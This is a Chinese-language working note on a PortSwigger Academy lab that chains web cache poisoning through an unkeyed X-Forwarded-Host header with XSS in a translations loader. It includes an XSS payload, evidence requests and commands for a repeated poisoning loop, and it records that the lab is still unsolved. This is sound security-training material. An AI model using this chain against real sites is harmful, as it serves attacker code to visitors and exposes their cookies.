---
title: "lab-web-cache-poisoning-combining-vulnerabilities"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-combining-vulnerabilities

> evidences: [[cache-poisoning-family]]

- 题面:Combining web cache poisoning vulnerabilities(/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)
- 实例:https://0aaf00fd03a6b6ab81730279004700d2.web-security-academy.net
- 利用服务器:https://exploit-0a2100eb0377b63281f201bd01dc0024.exploit-server.net
- 判定目标:投毒缓存,使访客浏览器执行 `alert(document.cookie)`
- 状态:**stuck**(链已验证;卡在访客 lang,未决面在本档)

## 已确认的链

1. `/` 页面 head:`data = {"host":"<X-Forwarded-Host>","path":"/"}`;页尾 `initTranslations('//' + data.host + '/resources/json/translations.json')`。
   **`X-Forwarded-Host` 未键控**(`/` 响应无 `Vary`),改写它即改 JSON 源地址。
2. `translations.js` 读 **`lang` cookie**,`lang in j && lang.toLowerCase() !== 'en'` 时对 `maincontainer` 做
   `el.innerHTML = dict[k]` —— 把 JSON 的翻译值当 HTML 注入(可 XSS)。
3. 利用服务器发 `/resources/json/translations.json`(`Access-Control-Allow-Origin: *` + 恶意 dict,key=页面里的
   "View details" 等,value=`<img src=x onerror=alert(document.cookie)>`)。
4. 投毒:`GET /` 带 `X-Forwarded-Host: exploit-…` → 缓存页 data.host 指向利用服务器(实测 X-Cache miss→缓存)。
5. 用 Chrome 验证:`/setlang/es`(置 lang=es)后加载投毒页 → 页面被 payload 注入/阻塞(alert 触发)→ **链成立**。

## 未决面

- `translate` 仅当访客 `lang != 'en'` 才执行;题面称访客语言为 English,而 `en` 键被显式跳过。
  需要第二处缺陷去改/绕访客的 `lang`(候选:`?localized`/`Set-Cookie` 缓存、或访客实际是 `en-gb` 而命中时机未对齐)。
- 注意:**自己用裸 `/` 校验 solved 会把干净页重新写回缓存**——校验/探测须带 cache-buster(用 `/?cb=<rand>` 读横幅)。

## 证据摘录

```
GET /  (X-Forwarded-Host: exploit-…) -> data = {"host":"exploit-0a2100…","path":"/"}  X-Cache: miss(缓存)
GET https://exploit-…/resources/json/translations.json -> Access-Control-Allow-Origin: *  (恶意 dict)
Chrome: /setlang/es 后 load 投毒 / -> maincontainer 被注入 <img src=x onerror=alert(document.cookie)>(页面阻塞)
GET /?cb=999001 -> is-solved 仍 false
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities" --out /tmp/b7-3.html
lab_launch launch 552E7C56A4A7BCC6D371C2EF2481F24B901667060DB0FC32531E717B73D4FD7A --widget-source /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities --jar /tmp/mar-jar.json
# 1) 利用服务器:responseFile=/resources/json/translations.json,含 ACAO:* 与恶意 dict(STORE)
# 2) 持续投毒(短 max-age,别再用裸 / 校验)
poison_loop "<inst>/" --header "X-Forwarded-Host: exploit-<id>.exploit-server.net" --interval-secs 12 --count 30
solved_check "<inst>/?cb=<rand>"      # 用 cache-buster 读横幅,避免污染 /
```

新件:`poison_loop`(定时重复投毒,保持短 max-age 缓存持久中毒)。
